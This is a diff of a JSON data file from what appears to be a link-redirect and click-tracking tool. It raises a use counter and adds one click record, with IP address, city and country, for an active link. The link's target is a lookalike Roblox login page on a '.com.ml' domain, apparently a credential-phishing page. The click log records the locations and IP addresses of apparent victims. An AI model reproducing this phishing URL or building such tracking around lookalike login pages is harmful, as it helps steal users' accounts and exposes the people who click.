@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 547,
+    "useCount": 548,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4488,6 +4488,14 @@
         "city": "Goiânia",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777095274879,
+        "ip": "138.84.94.78",
+        "country": "Philippines",
+        "city": "Talavera",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
